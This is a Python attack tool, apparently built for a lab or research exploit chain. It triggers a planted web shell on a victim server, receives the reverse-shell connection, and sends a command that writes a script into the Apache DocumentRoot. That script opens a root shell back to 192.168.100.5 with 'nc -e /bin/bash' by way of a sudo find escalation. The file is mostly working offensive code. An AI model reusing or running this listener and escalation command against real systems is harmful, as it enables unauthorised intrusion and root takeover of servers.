import socket, sys, time, os, requests, datetime, re, random, errno, pty, subprocess, sys
import threading

# DISCLAIMER
# I utilized as base code for this listener the code found on:
# https://tpetersonkth.github.io/2021/10/16/Creating-a-Basic-Python-Reverse-Shell-Listener.html

def get_root(host, r_port,port):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#root_shell = threading.Thread(target=listen, args=(h, port))
	#root_shell.start()
	# Bind the socket to the port
	server_address = (host, port)
	print('starting up on {} port {}'.format(*server_address))
	sock.bind(server_address)

	# Listen for incoming connections
	sock.listen(1)

	while True:
		# Wait for a connection
		print('waiting for a connection')
		connection, client_address = sock.accept()
	    
		try:
			print('connection from', client_address)
			connection.send('cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/) | awk \'{ print $3 }\' && echo \'#!/bin/bash\' | cat >> tttrev && echo \'nc 192.168.100.5 6666 -e /bin/bash\' | cat >> tttrev && chmod a+x tttrev && sudo find . -exec ./tttrev \; -quit\n'.encode())

		finally:
			# Clean up the connection
			connection.close()

def listen(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, port))
	s.listen(1)
	print("Listening on port " + str(port))
	conn, addr = s.accept()
	try:
		print('Connection received from ',addr)
		# Commands in order to get root access
		escalation = []
		flag = True
		while flag:
			#Receive data from the target and get user input
			print('[DEBBUG] Waitting for input')
			print("")
			ans = conn.recv(4194304).decode()
			print('[DEBBUG] Input Received')
			sys.stdout.write(ans)
			command = input()

			#Send command
			command = 'cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/) | awk \'{ print $3 }\' && echo \'#!/bin/bash\' | cat >> tttrev && echo \'nc 192.168.100.5 6666 -e /bin/bash\' | cat >> tttrev && chmod a+x tttrev && sudo find . -exec ./tttrev \; -quit\n'
			print('[DEBBUG] Sending command')
			conn.send(command.encode())
			print('[DEBBUG] Command sent')
			time.sleep(0.35)

			#Remove the output of the "input()" function
			sys.stdout.write("\033[A" + ans.split("\n")[-1])
			flag=False
	except KeyboardInterrupt:
		if conn:
			print('\n[-] Unbinding...')
			# Possible cleanup here
			time.sleep(0.2)
			conn.close()
			s.close()
	conn.close()


def listen_shell(victim_info, attacker_info, general_info):
	print('[DEBBUGER] LISTENNING')
	r_port = random.randint(1024, 65536)
	# Making sure the random port is not in use
	while check_port(attacker_info['ip'], r_port):
		r_port = random.randint(1024, 65536)
	get_access = threading.Thread(target=task, args=(victim_info['ip'], victim_info['port']))
	get_access.start() # Access the page that contains the reverse shell in order to establish connection
	#get_root(attacker_info['ip'],r_port,int(attacker_info['port']))
	listen(attacker_info['ip'],int(attacker_info['port']))


def task(v_ip, v_port):

	time.sleep(1)
	now = datetime.datetime.now()
	print('[*] Executing Thread for HTTP Request')
	if os.path.exists('./tmp_file_with_dest_url.txt'):
		f = open('./tmp_file_with_dest_url.txt', 'r')
		url = 'http://' + v_ip + ':' + str(v_port) + str(f.readline()).replace('\n', '')
		f.close()
		print('[*] Making request to execute reverse shell ', url)
		# Make the timeout very low in order not to wait for response
		# Make the exception pass so that the user does not get an error 
		try:
	    		requests.get(url, timeout=(1, 1))
		except requests.exceptions.ReadTimeout:
	    		pass
		except requests.exceptions.ConnectTimeout:
	    		sys.exit('[-] We couldn\'t find the exploit in the victim server, check if the server is alive')
	    		 
		os.remove('./tmp_file_with_dest_url.txt')
		print('[*] The exact time before lauching the exploit was: ', now)
		print('[*] You can use this time to help you filter the syscall logs')
		

	else:
		print('[-] URL wasn\'t generated, you might need to run the exploit another time')
		print('[-] If the problem persists, please confirm the information you passed')
		
		sys.exit()
		
			
def recvall(sock):
	BUFF_SIZE = 4096 # 4 KiB
	data = ''
	while True:
		time.sleep(0.07)
		part = sock.recv(BUFF_SIZE).decode()
		data += part
		if len(part) < BUFF_SIZE:
		# either 0 or end of data
			break
	return data
	
def check_port(ip, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.bind((ip, port))
	except socket.error as e:
		if e.errno == errno.EADDRINUSE:
			return True
		else:
			# something else raised the socket.error exception
			print(e)
			sys.exit()
	return False

	s.close()
